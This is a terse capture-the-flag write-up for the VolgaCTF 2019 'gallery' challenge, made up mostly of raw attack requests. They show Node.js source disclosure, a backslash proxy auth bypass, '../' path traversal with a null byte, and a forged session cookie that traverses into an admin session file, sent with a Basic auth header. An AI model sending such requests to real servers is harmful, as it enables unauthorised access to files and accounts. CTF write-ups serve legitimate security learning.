**Node.js source code disclosure**
```
http://gallery.q.2019.volgactf.ru/package.json
http://gallery.q.2019.volgactf.ru/js/index.js
http://gallery.q.2019.volgactf.ru/js/config.js
```

**Node.js proxy auth bypass**
```
GET /api\images?year=2018 HTTP/1.1
Host: gallery.q.2019.volgactf.ru
```

**PHP Directory Listing **
```
GET /api\images?year=../../../../../../%00 HTTP/1.1
Host: gallery.q.2019.volgactf.ru
```

**Node.js session-file-store Path Traversal**
```
GET /api/flag HTTP/1.1
Host: 142.93.204.169
Authorization: Basic dm9sZ2FjdGY6bmc5OGhhbnNkam5hc29pZmpuYW9zZmlu
Cookie: SESSION=s:../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM.KrY7Bi6sZtBB/J4sPnVj5QkDEuBu/0QelFQQqAV6yh4;
```